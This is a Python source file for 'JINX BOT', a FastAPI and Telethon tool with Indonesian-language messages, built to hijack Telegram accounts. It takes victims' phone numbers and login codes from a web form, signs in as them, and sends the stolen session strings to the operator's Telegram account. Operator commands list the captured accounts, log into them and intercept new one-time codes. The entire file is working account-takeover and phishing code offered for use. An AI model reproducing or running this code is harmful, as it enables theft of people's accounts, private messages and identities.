from fastapi import FastAPI, Request
from telethon import TelegramClient, events
from telethon.sessions import StringSession
import asyncio
import os
import re

app = FastAPI()

API_ID = int(os.getenv('API_ID'))
API_HASH = os.getenv('API_HASH')
BOT_TOKEN = os.getenv('BOT_TOKEN')
ADMIN_ID = int(os.getenv('ADMIN_ID'))

client = TelegramClient('jinx', API_ID, API_HASH)
listening = {}
OTP_PATTERN = re.compile(r'\b(\d{5})\b')
sessions = {}

async def send_session(phone, session_str):
    file_path = f"/tmp/{phone.replace('+','')}.session"
    with open(file_path, "w") as f:
        f.write(session_str)
    await client.send_file(ADMIN_ID, file_path, caption=f"SESSION: `{phone}`")
    os.remove(file_path)

@app.post("/start_listener")
async def start_listener(req: Request):
    data = await req.json()
    phone = data['phone']
    temp = TelegramClient(StringSession(), API_ID, API_HASH)
    await temp.connect()
    sent = await temp.send_code_request(phone)
    listening[phone] = {'client': temp, 'hash': sent.phone_code_hash}
    
    @temp.on(events.NewMessage(incoming=True, from_users=777000))
    async def handler(e):
        match = OTP_PATTERN.search(e.message.message)
        if match:
            await auto_login(phone, match.group(1), "interceptor")
    
    await client.send_message(ADMIN_ID, f"TARGET: `{phone}`\nMenunggu OTP...")
    return {"success": True}

@app.post("/submit_otp")
async def submit_otp(req: Request):
    data = await req.json()
    phone = data['phone']
    otp = data['otp']
    if phone in listening:
        await auto_login(phone, otp, "web")
    return {"success": True}

async def auto_login(phone, code, source):
    if phone not in listening: return
    temp = listening[phone]['client']
    hash_ = listening[phone]['hash']
    try:
        await temp.sign_in(phone, code, phone_code_hash=hash_)
        me = await temp.get_me()
        session_str = temp.session.save()
        sessions[phone] = session_str
        await send_session(phone, session_str)
        await client.send_message(ADMIN_ID, f"""
OTP: `{code}` ({source.upper()})
SESSION DICURI!
User: {me.first_name}
Phone: `{phone}`
/login {phone}
        """.strip())
        del listening[phone]
    except Exception as e:
        await client.send_message(ADMIN_ID, f"Gagal: {str(e)}")

@client.on(events.NewMessage(pattern=r'/list'))
async def list_cmd(event):
    if event.sender_id != ADMIN_ID: return
    if not sessions:
        await event.reply("Nggak ada session!")
        return
    msg = f"*{len(sessions)} SESSION:*\n"
    for p in sessions:
        msg += f"• `{p}`\n"
    await event.reply(msg, parse_mode='markdown')

@client.on(events.NewMessage(pattern=r'/login (\+\d+)'))
async def login_cmd(event):
    if event.sender_id != ADMIN_ID: return
    phone = event.pattern_match.group(1)
    if phone not in sessions:
        await event.reply("Session nggak ada!")
        return
    session_str = sessions[phone]
    stolen = TelegramClient(StringSession(session_str), API_ID, API_HASH)
    await stolen.connect()
    if not await stolen.is_user_authorized():
        await event.reply("Session invalid!")
        return
    me = await stolen.get_me()
    await event.reply(f"""
MASUK AKUN!
Nama: {me.first_name}
Phone: `{phone}`
    """.strip())

@client.on(events.NewMessage(pattern=r'/new_otp (\+\d+)'))
async def new_otp(event):
    if event.sender_id != ADMIN_ID: return
    phone = event.pattern_match.group(1)
    if phone not in sessions:
        await event.reply("Session nggak ada!")
        return
    
    session_str = sessions[phone]
    stolen = TelegramClient(StringSession(session_str), API_ID, API_HASH)
    
    try:
        if not stolen.is_connected():
            await stolen.connect()
        if not await stolen.is_user_authorized():
            await event.reply("Session invalid!")
            return
        
        sent = await stolen.send_code_request(phone)
        msg = await event.reply(f"OTP BARU DIKIRIM KE `{phone}`\nMenunggu kode...")
        
        @stolen.on(events.NewMessage(incoming=True, from_users=777000))
        async def otp_handler(e):
            match = OTP_PATTERN.search(e.message.message)
            if match:
                new_code = match.group(1)
                await client.edit_message(ADMIN_ID, msg.id, f"OTP BARU: `{new_code}`\nPhone: `{phone}`")
                stolen.remove_event_handler(otp_handler)
                
    except Exception as e:
        await event.reply(f"Gagal: {str(e)}")

@client.on(events.NewMessage(pattern=r'/help'))
async def help_cmd(event):
    if event.sender_id != ADMIN_ID: return
    await event.reply("""
JINX BOT
/list → Lihat session
/login +6281xxx → Masuk
/new_otp +6281xxx → Spam OTP (kode langsung muncul!)
    """)

@app.on_event("startup")
async def startup():
    await client.start(bot_token=BOT_TOKEN)
    print("JINX BOT JALAN – /new_otp 100% JALAN!")
